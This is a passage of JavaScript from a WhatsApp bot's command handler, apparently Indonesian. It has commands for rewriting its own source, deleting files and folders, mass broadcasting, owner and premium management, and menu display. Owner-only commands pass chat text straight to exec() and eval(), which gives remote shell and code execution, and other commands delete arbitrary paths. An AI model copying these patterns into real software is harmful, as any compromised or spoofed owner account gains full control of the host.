    const namaFile = './message/case.js';
    const caseBaru = `${q}`;

    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }
        
        const posisiAwalGimage = data.indexOf("case 'addcase':");

        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    setReply('Error File: ' + err); 
                } else {
                    setReply('Sukses Menambahkan case'); 
                }
            });
        } else {
            setReply('Gagal Menambahkan case'); 
        }
    });
}
break;

case 'delcase': {
    if (!isOwner) return onlyOwner();

    // Cek apakah ada input case yang ingin dihapus
    if (!q) return setReply('Penggunaan salah. Silakan ketik `delcase Fitur` yang ingin dihapus.');

    // Nama file yang akan dimodifikasi
    const namaFile = './message/case.js';

    // Case yang ingin dihapus
    const caseToDelete = `case '${q}':`;

    // Baca isi file
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return setReply('Terjadi kesalahan saat membaca file.'); // Mengganti 'reply' menjadi 'setReply'
        }

        // Cari posisi case yang ingin dihapus
        const posisiCase = data.indexOf(caseToDelete);
        if (posisiCase === -1) {
            return setReply(` case ${q} tidak ditemukan dalam file.`); // Mengganti 'args' menjadi 'text' untuk konsistensi
        }

                         
        // Cari posisi break; berikutnya setelah case
        const posisiBreak = data.indexOf('break;', posisiCase);
        if (posisiBreak === -1) {
            return setReply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.'); // Mengganti 'reply' menjadi 'setReply'
        }

        // Potong data untuk menghapus case
        const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return setReply('Terjadi kesalahan saat menulis file.'); // Mengganti 'reply' menjadi 'setReply'
            } else {
                return setReply(`Case '${q}' berhasil dihapus.`); // Mengganti 'reply' menjadi 'setReply'
            }
        });
    });
}
break;

case 'listcase': {
//let { listCase } = require('./lib/scrapelistCase.js')
setReply(listCase())
}
break
case 'sendcase':
try {
    if (!isOwner && !itsMe) return onlyOwner();
    if (!q) return setReply("*Mau kirim Case apa kak?*");

    let who;
    try {
        if (m.isGroup) {
            // Cek apakah ada tag atau reply, jika tidak gunakan pengirim
            who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
        } else {
            who = m.sender; // Jika bukan grup, gunakan pengirim
        }
    } catch (err) {
        if (m.isGroup) {
            who = args[0] + '@s.whatsapp.net'; // Jika tidak ada tag atau reply, ambil dari argumen pertama
        } else {
            who = m.sender; // Jika terjadi kesalahan, gunakan pengirim
        }
    }

    // Jika tidak ada target, beritahu pengguna
    if (!who) return setReply(`Tag atau nomor tidak ditemukan!`);

    // Jika query dimulai dengan prefix, tolak permintaan
    if (q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix");

    // Dapatkan case berdasarkan query yang diberikan
    let caseData = await getCase(q);
    if (!caseData) return setReply(`Case ${q} tidak ditemukan`);

    // Kirim case ke target yang ditentukan
  let kirCas = `${gris}Hai Kak Ada Kiriman case Dari Owner Ku Nih${gris} \n\n ${caseData}`
    await hanz.sendMessage(who, { text: kirCas });

    // Beritahu bahwa case berhasil dikirim
    setReply(`Case "${q}" berhasil dikirim ke ${who}`);
} catch (err) {
    console.log(err);
    setReply(`Case ${q} tidak ditemukan atau terjadi kesalahan`);
}
break;
case 'getfunc':
    if (!isOwner) return; // Check if the user is the owner
    if (!q) return reply(`Contoh penggunaan: ${prefix + command} onlyLimit`); // Ensure function name is provided

    const getfunc = (funcc) => {
        const fileContent = fs.readFileSync('./message/case.js', 'utf8'); // Read the file content
        const functionRegex = new RegExp(`const ${funcc} = (.*?)};`, 's'); // Regex to match the function
        const match = fileContent.match(functionRegex);
        return match ? match[0] : `Function ${funcc} tidak ditemukan.`; // Return the function or an error message
    };

    reply(`${getfunc(q)}`); // Respond with the function code
    break; 
case 'delfile':
if (!isOwner) return onlyOwner()
if (!q) return m.reply("Ex: .delfile ./database/prem.json")
fs.unlinkSync(q)
m.reply ("Done")
break

case 'delfolder':
if (!isOwner) return onlyOwner
 const rimraf = require('rimraf')
if (!q) return reply(`*Ex* : ${prefix + command} ./session`)
rimraf.sync(`${q}`)
reply(`Berhasil hapus folder ${q}`)
break
case 'bcuser': {
  if (!isOwner && !itsMe) return onlyOwner()
  if (!q) return setReply('Teksnya?')
  // Daftar ID pengguna yang akan dikirimi broadcast
  let userList = Object.keys(global.db.data.users);
  // Jika ada media yang di-quote atau dikirim
  if (isQuotedImage || isImage || isQuotedAudio || isVideo || isQuotedVideo) {
    var alala = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5))
  }
  setReply(`Mengirim Broadcast Ke ${userList.length} Chat, Waktu Selesai ${userList.length * 0.5 } detik`)
  for (let i of userList) {
    let text = Ehztext(`
      *_Broadcast User_*

      ––––––『 *MESSAGE* 』––––––

      ${q}\n\nDate : ${calender}
    `)

    await sleep(1000)
    let contextInfo = {
      forwardingScore: 50,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid,
        serverMessageId: 100,
        newsletterName
      },
      externalAdReply: {
        showAdAttribution: true,
        renderLargerThumbnail: true,
        title: `${baileysVersion}`,
        body: `Runtime ${runTime}`,
        mediaType: 1,
        containsAutoReply: true,
        thumbnailUrl:'https://telegra.ph/file/b93cbe00c79246b8ef3f6.png'
      }
    }

    if (isQuotedImage || isImage) {
      hanz.sendMessage(i, { contextInfo, image: fs.readFileSync(alala), caption: text })
    } else if (isQuotedVideo || isVideo) {
      hanz.sendMessage(i, { contextInfo, video: fs.readFileSync(alala), caption: text })
    } else if (isQuotedAudio) {
      hanz.sendMessage(i, { contextInfo, audio: fs.readFileSync(alala) })
    } else {
      hanz.sendMessage(i, { contextInfo, text })
    }
  }

  setReply(`Sukses Mengirim Broadcast Ke ${userList.length} Pengguna`)
}
break
case 'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await hanz.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
if(isQuotedImage || isImage || isQuotedAudio || isVideo || isQuotedVideo) {
var alala = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
}
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)

for (let i of anus) {
let text = Ehztext(`
*_Broadcast Group_*

––––––『 *MESSAGE* 』––––––

${q}\n\nDate : ${calender}

`)

await sleep(1000)
let contextInfo = {
forwardingScore: 50,
isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid,
  serverMessageId: 100,
  newsletterName
  },
externalAdReply:{
showAdAttribution: true,
renderLargerThumbnail : true,
title: `${baileysVersion}`,
body:`Runtime ${runTime} `,
mediaType: 1, 
containsAutoReply: true,
thumbnailUrl:"https://telegra.ph/file/89178aae70c89f30febca.png"
}
}
if(isQuotedImage || isImage){
hanz.sendMessage(i,{contextInfo,image:fs.readFileSync(alala),caption:text})

} else if(isQuotedVideo || isVideo){
hanz.sendMessage(i,{contextInfo,video:fs.readFileSync(alala),caption:text})
} else if(isQuotedAudio){
hanz.sendMessage(i,{contextInfo,Audio:fs.readFileSync(alala)})
} else  
 hanz.sendMessage(i,{contextInfo,text})
 
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case 'upch': {
  if (!quoted) return m.reply('Harap reply pesan');
const { proto, generateWAMessageFromContent } = require('baileys');
  // Mendapatkan pesan yang di-reply
  const messages = m.quoted.fakeObj.message;

  // Encode pesan untuk dikirim
  const messageToChannel = proto.Message.encode(messages).finish();
  
  // Mempersiapkan objek hasil yang akan dikirim
  const result = {
    tag: 'message',
    attrs: { to: `${global.newsletterJid1}`, type: 'text' },
    content: [
      {
        tag: 'plaintext',
        attrs: {},
        content: messageToChannel
      }
    ]
  };

  // Mengirim pesan ke channel
  const res = await hanz.query(result);

  // Memberikan balasan setelah berhasil
  reply('Berhasil');
}
break;
case 'listgc': {
    if (!isOwner) return onlyOwner()
    let getGroups = await hanz.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let anu = groups.map(v => v.id);
    
    let teks = `📋 *Daftar Group Chat* 📋\n\n📊 *Total*: ${anu.length} Grup\n\n`;

    for (let i of anu) {
        var metadata2 = await hanz.groupMetadata(i);
        teks += `👥 *Nama*: ${metadata2.subject}\n` +
                `👑 *Owner*: ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n` +
                `🆔 *ID*: ${metadata2.id}\n` +
                `🗓️ *Dibuat*: ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n` +
                `👤 *Jumlah Member*: ${metadata2.participants.length}\n` +
                `────────────────────────\n\n`;
    }

    hanz.sendMessage(from, { text: teks, mentions: anu.map(v => metadata2.owner) }, { quoted: m });
}
break;
case 'listpc': {
    if (!isOwner) return onlyOwner()
    let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id);
    let teks = `📬 *Daftar Private Chat* 📬\n\n🌐 *Total*: ${anulistp.length} Chat\n\n`;

    for (let i of anulistp) {
        let nama = store.messages[i].array[0].pushName || 'Tidak diketahui';
        let sender = i;

        teks += `👤 *Nama*: ${nama}\n` +
                `🔗 *User*: @${sender.split('@')[0]}\n` +
                `💬 *Chat*: [Klik di sini](https://wa.me/${sender.split('@')[0]})\n\n` +
                `──────────────────\n\n`;
    }

    hanz.sendMessage(from, { 
        text: teks, 
        mentions: anulistp.map(v => v.split('@')[0]) 
    }, { quoted: m });
}
break;
case 'joinsewa':
case 'addsewa': {
    if (!isGroup) {
        const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
        let LinkGc = q.split(" ")[0];
        let Second = q.split(" ")[1];
        let code = LinkGc.match(rex1);
        if (code == null) return setReply("Tidak ada URL undangan yang terdeteksi.");
        let kode = code[0].replace("chat.whatsapp.com/", "");
        await hanz.groupAcceptInvite(kode);
        let { id, subject, creator, creation, desc, descId } = await hanz.groupGetInviteInfo(kode).catch(async () => {
            return setReply("URL undangan tidak valid.");
        });
        let teks = `
Berhasil
*Nama:* ${subject}
*Id:* ${id}
*Durasi:* ${conn.msToDate(toMs(Second))}
*Hitung Mundur:* ${toMs(Second)}
`;
        setReply(teks);
        
        await _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa);
        await sleep(3000)
      await hanz.sendMessage(m.chat, {
    text: `Hallo Aku ${botName}\nAku Datang Kesini Untuk Menemani Kalian\n\n.ceksewa\nUntuk Melihat Waktu Sewa`
}, { quoted: null});

    } else if (isGroup) {
        if (!q) return setReply("Harap masukkan durasi dalam format 1m/1d/1h");
        if (isBotGroupAdmins) {
            let linkgc = await hanz.groupInviteCode(from);
            var yeh = `https://chat.whatsapp.com/${linkgc}`;
        } else if (!isBotGroupAdmins) {
            var yeh = `Bot bukan admin`;
        }
        _sewa.addSewaGroup(from, groupName, yeh, q, sewa);
        setReply("Berhasil menambahkan sewa ke grup");
    }
}
break
case 'listsewa':
    let ordernye = `✨ *List Sewa* ✨\n🗓️ *Jumlah*: ${sewa.length}\n\n`;

    for (let i of sewa) {
        let cekvipp = ms(i.expired - Date.now());
        ordernye += `📌 *Group*: ${i.group}\n` +
                    `🔑 *ID*: ${i.id}\n` +
                    `⏳ *Expired*: ${cekvipp.days} Hari ${cekvipp.hours} Jam ${cekvipp.minutes} Menit ${cekvipp.seconds} Detik\n` +
                    `🔗 *Link*: ${i.linkgc}\n\n`;
    }

    ordernye += `© ${botName} - Terima kasih telah menggunakan layanan kami!`;

    setReply(ordernye);
    break;

case 'ceksewa':
case 'sewacek':
    if (!isGroup) return onlyToko()
    if (!_sewa.checkSewaGroup(from, sewa)) {
        return setReply(`⚠️ Group ini tidak terdaftar dalam list sewabot. Ketik *${prefix}sewabot* untuk info lebih lanjut.`);
    }

    let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now());
    let sewenye = Ehztext(`🌟 *SEWA EXPIRE* 🌟
    
📌 *Group*: ${groupName}
🔑 *ID*: ${from}
⏳ *EXPIRE*: ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik
    
🎉 Terima kasih telah menggunakan layanan kami!`);
    
    setReply(sewenye);
    break;
case 'addowner': {
    if (!isOwner) return onlyOwner();  // Cek apakah pengguna yang menjalankan perintah adalah owner
    if (!isGroup) return setReply(mess.only.group);  // Cek apakah perintah dilakukan di grup
    
    let targetNumber;
    
    // Cek apakah ada input nomor manual atau pesan yang di-reply
    if (q) {
        // Jika ada input manual (nomor)
        targetNumber = q.split("@")[0];  // Ambil nomor dari input (tanpa '@')
    } else if (quoted) {
        // Jika tidak ada input nomor, cek apakah ada reply pesan
        const quotedMessageSender = quoted.sender;  // Mengambil pengirim dari pesan yang di-reply
        targetNumber = quotedMessageSender.split("@")[0];  // Memisahkan nomor dari identifier WA
    } else {
        // Jika tidak ada input manual atau reply pesan
        return setReply("Masukan nomor target atau reply pesan dari target");
    }
    
    // Cek apakah nomor sudah ada di database owner
    if (checkDataId("owner", targetNumber, DataId)) return setReply("User sudah menjadi owner");
    
    // Jika belum ada di database, tambahkan
    if (!checkDataName("owner", targetNumber, DataId)) {
        await createDataId("owner", DataId);  // Buat data owner jika belum ada
    }
    
    addDataId(targetNumber, "owner", DataId);  // Tambahkan nomor ke daftar owner
    setReply(`Berhasil menambahkan ${targetNumber} ke daftar owner`);  // Beri respon sukses
}
break;

case 'delowner': {
    if (!isOwner) return onlyOwner();  // Cek apakah pengguna yang menjalankan perintah adalah owner
    
    let targetNumber;
    
    // Cek apakah ada input nomor manual atau pesan yang di-reply
    if (q) {
        // Jika ada input manual (nomor)
        targetNumber = q.split("@")[0];  // Ambil nomor dari input (tanpa '@')
    } else if (quoted) {
        // Jika tidak ada input nomor, cek apakah ada reply pesan
        const quotedMessageSender = quoted.sender;  // Mengambil pengirim dari pesan yang di-reply
        targetNumber = quotedMessageSender.split("@")[0];  // Memisahkan nomor dari identifier WA
    } else {
        // Jika tidak ada input manual atau reply pesan
        return setReply("Masukan nomor target atau reply pesan dari target");
    }
    
    try {
        // Cek apakah nomor ada di database owner
        if (!checkDataId("owner", targetNumber, DataId)) return setReply(`User bukan owner`);
        
        // Hapus nomor dari daftar owner
        removeDataId("owner", targetNumber, DataId);
        setReply(`Berhasil menghapus ${targetNumber} dari daftar owner`);
    } catch (err) {
        console.log(err);
        setReply(`${err}`);  // Tampilkan pesan error jika terjadi
    }
}
break;

case 'listowner': {
    if (!checkDataName("owner", q, DataId)) {
        await createDataId("owner", DataId);
    }
    
    let owners = await DataId.filter(item => item.name === "owner");
    
    if (owners.length === 0) return setReply("❌ *Tidak ada Owner yang terdaftar.*");
    
    let teks = "*List Owner*\n\n";
    let ownerIds = owners[0].id;

    for (let id of ownerIds) {
        teks += `- wa.me/${id.split("@")[0]}\n`;
    }
    
    setReply(teks);
}
break;
/*case 'addprem': {
    if (!isOwner) return onlyOwner();

    let nomernya, waktunya, namanye;

    if (isGroup && mentionByReply) {
        nomernya = mentionByReply;
        waktunya = q;
        namanye = await hanz.getName(mentionByReply);
    } else if (isGroup && mentionByTag) {
        nomernya = mentionByTag[0];
        waktunya = q.split(" |")[1] || q.split("| ")[1] || q.split("|")[1] || q.split(" ")[1];
        namanye = await hanz.getName(mentionByTag[0]);
    } else if ((isGroup || !isGroup) && q.startsWith("+")) {
        nomernya = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`;
        waktunya = q.split("|")[1];
        namanye = await hanz.getName(nomernya);
    } else {
        return setReply("Penggunaan salah, silakan reply/tag/input nomer +");
    }

    Log(q.split("|")[0]);
    
    if (waktunya === undefined) {
        return setReply("Masukkan waktu\ns = detik\nh = jam\nd = hari");
    }

    try {
        await _prem.addPremiumUser(nomernya, waktunya, namanye, premium);

        let teks = `
_*SUCCESS*_

🆔 *Name :* ${namanye}
📛 *Number:* ${nomernya.split("@")[0]}
📆 *Days:* ${conn.msToDate(toMs(waktunya))}
📉 *Countdown:* ${toMs(waktunya)}`;

        let text = `HALO KAK AKU *${botName}*
kamu telah terdaftar sebagai user premium

📛 *Number:* ${nomernya.split("@")[0]}
📆 *Days:* ${hanz.msToDate(toMs(waktunya))}
📉 *Countdown:* ${toMs(waktunya)}

Terima kasih sudah menggunakan ${botName}`;

        setReply(teks);
        hanz.sendMessage(nomernya, { text });
    } catch (error) {
        return setReply("Penggunaan salah, silakan ketik `addprem reply/tag/nomor masukkan hari/jam/detik, contoh: 10d`");
    }
}
break;*/
case 'addprem': {
    if (!isOwner) return onlyOwner();

    let nomernya, waktunya, namanye;

    // Cek apakah ada reply pesan
    if (isGroup && quoted) {
        nomernya = quoted.sender;  // Mengambil nomor dari pesan yang di-reply
        waktunya = q;
        namanye = await hanz.getName(quoted.sender);  // Mendapatkan nama dari nomor yang di-reply
    } else if (isGroup && mentionByTag) {
        // Jika pengguna ditandai
        nomernya = mentionByTag[0];
        waktunya = q.split(" |")[1] || q.split("| ")[1] || q.split("|")[1] || q.split(" ")[1];
        namanye = await hanz.getName(mentionByTag[0]);
    } else if ((isGroup || !isGroup) && q.startsWith("+")) {
        // Jika input berupa nomor manual
        nomernya = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`;
        waktunya = q.split("|")[1];
        namanye = await hanz.getName(nomernya);
    } else {
        return setReply("Penggunaan salah, silakan reply/tag/input nomer +");
    }

    Log(q.split("|")[0]);  // Log input untuk debugging
    
    if (waktunya === undefined) {
        return setReply("Masukkan waktu\ns = detik\nh = jam\nd = hari");
    }

    try {
        // Tambahkan pengguna ke daftar premium
        await _prem.addPremiumUser(nomernya, waktunya, namanye, premium);

        let teks = `
_*SUCCESS*_

🆔 *Name :* ${namanye}
📛 *Number:* ${nomernya.split("@")[0]}
📆 *Days:* ${hanz.msToDate(toMs(waktunya))}
📉 *Countdown:* ${toMs(waktunya)}`;

        let text = Ehztext(`HALO KAK AKU *${botName}*
kamu telah terdaftar sebagai user premium

📛 *Number:* ${nomernya.split("@")[0]}
📆 *Days:* ${hanz.msToDate(toMs(waktunya))}
📉 *Countdown:* ${toMs(waktunya)}

Terima kasih sudah menggunakan ${botName}`);

 setReply(teks)  // Mengirim pesan konfirmasi
 

// Mengirim pesan dengan gambar
await hanz.sendMessage(nomernya, {
    image: { url: 'https://pomf2.lain.la/f/xd2bkqo3.jpg' }, // Menggunakan URL gambar
    caption: text // Mengirim teks sebagai caption
});

    } catch (error) {
        return setReply("Penggunaan salah, silakan ketik `addprem reply/tag/nomor masukkan hari/jam/detik, contoh: 10d`");
    }
}
break;

case 'listprem': {
    let txt = `*🌟 LIST PREMIUM USERS 🌟*\n\nTotal: ${premium.length}\n\n`;
    let men = [];

    for (let i of premium) {
        Log(i.id);
        men.push(i.id);
        let cekvip = ms(i.expired - Date.now());
        txt += `🆔 ID: wa.me/${i.id.split("@")[0]}\n⏳ Expired: ${cekvip.days} Hari, ${cekvip.hours} Jam, ${cekvip.minutes} Menit, ${cekvip.seconds} Detik\n\n`;
    }

    setReply(txt, men);
}
break;
case 'delprem': {
    if (!isOwner) return onlyOwner();

    let targetNumber;

    // Cek apakah ada input nomor manual, reply pesan, atau tag
    if (q) {
        // Jika ada input nomor manual
        targetNumber = q.split("@")[0];  // Ambil nomor dari input
    } else if (quoted) {
        // Jika ada reply pesan
        targetNumber = quoted.sender.split("@")[0];  // Mengambil nomor dari pesan yang di-reply
    } else if (mentionByTag && mentionByTag.length > 0) {
        // Jika ada pengguna yang ditandai
        targetNumber = mentionByTag[0].split("@")[0];  // Ambil nomor dari tag
    } else {
        return setReply("Tag/Reply/Input nomor target yang ingin dihapus dari daftar premium");
    }

    // Cek apakah nomor ada di database premium
    if (!_prem.checkPremiumUser(targetNumber + "@s.whatsapp.net", premium)) {
        return setReply("Maaf, user tersebut tidak ada di database premium");
    }

    // Hapus user dari daftar premium
    _prem.delPremiumUser(targetNumber + "@s.whatsapp.net", premium);
    setReply(`Sukses menghapus premium untuk ${targetNumber}`);
}
break;

case 'cekprem':
case 'cekpremium': {
    if (!isPremium && !isOwner) return onlyPrem();

    let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now());
    let premiumnya = `*🛡️ STATUS PREMIUM USER 🛡️*\n\n` +
                     `⏳ *Sisa Waktu:* ${cekvip.days} Hari, ${cekvip.hours} Jam, ${cekvip.minutes} Menit, ${cekvip.seconds} Detik\n\n` +
                     `✨ Terima kasih telah menjadi pengguna premium!`;

    setReply(premiumnya);
}
break;
 case 'join':{
	if(!isOwner) return onlyOwner()
	let link = q.startsWith("http")
	if(!link) return setReply(`Kirim perintah ${command} _linkgrup_`)
	var url = args[1]
	let ano = q.split('https://chat.whatsapp.com/')[1]
	await hanz.groupAcceptInvite(ano)
	setReply("Sukses join group")
	}
	break
        

       /* case 'out':
	if (!isGroup) return onlyToko()
	if (!isOwner) return onlyOwner()
	await hanz.groupLeave(from)
	break*/
case 'public':
	if (!isOwner) return onlyOwner()
	if (publik) return setReply('Udah di mode publick kak')
	publik = true
	let bab =`Mode public aktif kak`
	setReply(bab)
	break
case 'self':
	if (!isOwner) return onlyOwner()
	if (publik == false) return setReply('Udah di mode self kak')
	publik = false
	let breh =`Mode self aktif kak`
	setReply(breh)
	break
case '$':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`*>_ Console*\n\n${stdout}`)
}
})
}
break
case '>': {
if (!isOwner) return onlyOwner()
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
break
// =========== MAIN MENU ==========//
case 'allmenu':{
let { allmenu, fitur} = require('./help')
let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname) 
let fiturnya = fitur() 
let teksnya = menunya + fiturnya
hanz.editmsg(m.chat,teksnya,m)
}
break
case 'menu': case 'helpmen': {
// Pastikan objek user didefinisikan
    if (!user || !user.registered) { 
        return sendButDaftar(); 
    }
if(!isGroup) return onlyToko()
let { allmenu, fitur} = require('./help')
let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname) 
let fiturnya = fitur() 
 let data = global.db.data.others['runtime']
      let time = (new Date - data.runtime) || "Tidak terdeteksi"
//let rm = pickRandom(pdf)
if (setmenu == "document"){
hanz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: wm,
mimetype: "application/vnd.ms-powerpoint",
jpegThumbnail:fs.readFileSync("./stik/thumb.jpeg"),
caption: menunya+fiturnya,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: botName,
body: `Hai  ${ucapanWaktu} kak ${pushname}` ,
thumbnail: fs.readFileSync('./stik/thumb.jpeg'),
thumbnailUrl:await pickRandom(fotoRandom),
sourceUrl: web,
mediaType: 1,
renderLargerThumbnail: true 
}}}, { quoted: m,ephemeralExpiration: 86400});
await sleep(1500) 
sendvn1(dmusic)
} else if (setmenu == "image"){


      const { proto, generateWAMessageFromContent,prepareWAMessageMedia } = require('baileys');
            let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: menunya+fiturnya
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text:null
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false,
           ...await prepareWAMessageMedia({ image: { url : pickRandom(fotoRandom) }}, { upload: hanz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text": "Dashboard", "id": ".dashboard"}`
              }
              ],
          })
        })
    }
  }
}, {quoted: m, userJid: m})

hanz.relayMessage(m.chat, msg.message, {
  messageId: msg.key.id,
})
            
   
await sleep(1500) 
sendvn(dmusic)
} else if (setmenu == "gif"){
hanz.sendMessage(m.chat, { video: fs.readFileSync('./stik/video.mp4'),gifPlayback: true,
  caption: menunya+fiturnya, contextInfo: {
 externalAdReply: {
containsAutoReply: true,
mediaType: 1,
//mediaUrl: 'https://telegra.ph/file/803e9b20c514befd3cffa.jpg',
renderLargerThumbnail: true,
showAdAttribution: true,
sourceUrl: "https://instagram.com/ehanzdhoanx",
thumbnailUrl: pickRandom(fotoRandom),
title:wm,
body: `${ucapanWaktu} kak ${pushname}`,},},}, { quoted: m }); 
await sleep(1500) 
sendvn1(dmusic)
} else if (setmenu == "katalog"){
 const { generateWAMessageFromContent } = require("baileys")
let prep = generateWAMessageFromContent(m.chat, { orderMessage: { 
itemCount: `90000`, status: 500,
surface: 999,
message: menunya+fiturnya,
description: '^^',
orderTitle: 'ʙᴇᴊɪʀ ᴅᴇᴋ',
token: '120363212768920223@g.us',
mediaType: 1,
curreyCode: 'IDR',
totalCurrencyCode: 'ʙᴇᴊɪʀ ᴅᴇᴋ',
totalAmount1000: '50000',
sellerJid: '6281316643491@s.whatsapp.net',
thumbnail: fs.readFileSync('./stik/rangel.jpg'), 
//thumbnaiUrl: pickRandom(fotoRandom)
}}, {contextInfo:{ externalAdReply: {
showAdAttribution: true, 
title: `${week} , ${calender}`,
body: `${botName}`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl:pickRandom(fotoRandom),
sourceUrl: `${web}`}},quoted: fkontak})
hanz.relayWAMessage(prep)
await sleep(1500) 
sendvn1(dmusic)
    } else if (setmenu == "thumbnail"){
let teksMenu = Ehztext(`乂 Hai ${ucapanWaktu}

${gris}INFO${gris} :
◍ Nama : ${pushname}
◍ Bot Type : Case&Plug
◍ Library : ${baileysVersion}

> ${gris}${botName}${gris} Adalah Bot WhatsApp Yang Di Rancang Untuk Menemani Kehidupan Virtual Di Dunia Maya Terutama Bisa Di Pakai Sebagai Alat Unduhan Media,Bermain Game,Pembelajaran,Penjulan Dan Lain Sebagainya,Dengan List Yang Tertata Di Menu Bot

${gris}NOTE :${gris}
> Bot ini dalam tahap pengembangan harap di maklumi jika terjadi eror 💌

> __est.2023™_

]––––––『 *LIST MENU BOT* 』––––––[
 ${readmore} 
`)
hanz.sendMessage(from, { contextInfo: {
            externalAdReply: {
                showAdAttribution: true, 
                title: `${botName}`,
                body: `Runtime ${runTime}`,
                mediaType: 1,  
                renderLargerThumbnail: true,
                thumbnailUrl:"https://telegra.ph/file/9a171740d29bdf7427296.jpg",
                sourceUrl: `${web}`
            },
            editKey: { 
                remoteJid: from, 
                id: 'some_unique_message_id'  // Pastikan ini sesuai dengan kunci unik yang relevan
            }
        },
        text: teksMenu+fiturnya
    }, { quoted: m });
await sleep(1500) 
sendvn1(dmusic)
} else if (setmenu == "payment"){
let numb = ["7.76","15.48","8.92","10.72","13.48","4.39","5.99","2.56"]
let amont = numb[Math.floor(Math.random() * numb.length)]
hanz.relayMessage(from,  {
requestPaymentMessage : {
expiryTimestamp: 0,												
currencyCodeIso4217: 'USD',
amount1000: (amont) * 1000,
requestFrom: `${sender.split('@')[0]}@s.whatsapp.net`,
noteMessage: {
extendedTextMessage: {
text : menunya+fiturnya,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
}
}
}
}
}
}, {})
await sleep(1500) 
sendvn1(dmusic)
} else if (setmenu == "livelocation"){
hanz.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: 35.676570,
degreesLongitude: 139.762148,
caption :menunya+fiturnya,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: null,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
containsAutoReply: true,
showAdAttribution: true,
}
}
}
}, {quoted: m})
await sleep(1500) 
sendvn1(dmusic)
} else if (setmenu == "toko"){
 onlyToko()


} else if (setmenu == "button"){

    const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("baileys")
try{ 
var saldo = db.data.users[sender].balance.toLocaleString() 
} catch{ 
var saldo = db.data.users[sender].balance
}
let teksMenub = Ehztext(`
${gris}⚡️ *INFO* ⚡️:
◍ *Nama*: ${pushname}
◍ *Bot Type*: Case & Plugin
◍ *Library*: ${baileysVersion}

> ${gris}${botName}${gris} merupakan Bot WhatsApp serbaguna yang dirancang untuk mendukung berbagai aktivitas virtual kamu. Bot ini dapat digunakan untuk berbagai kebutuhan seperti mengunduh media, bermain game, pembelajaran, transaksi penjualan, dan masih banyak lagi! Fitur-fitur ini dirangkum dengan rapi dalam menu yang mudah diakses.

${gris}💡 *CATATAN*: ${gris}
> Bot ini sedang dalam tahap pengembangan aktif. Kami mohon pengertiannya jika terjadi kesalahan atau bug. Terima kasih atas dukungannya! 💌

> _est. 2023™_`)

const caption = `${teksMenub}`;
let sections = [
  {
    title: '🍱 All Menus',
    highlight_label: 'All Menu List',
    rows: [
      {
        title: '📜 Show All Menus',
        description: 'Menampilkan semua fitur bot yang tersedia.',
        id: `${prefix}menu all`
      }
    ]
  },
  {
    title: '📂 Menu Kategori',
    rows: [
      {
        title: '🗞️ Info',
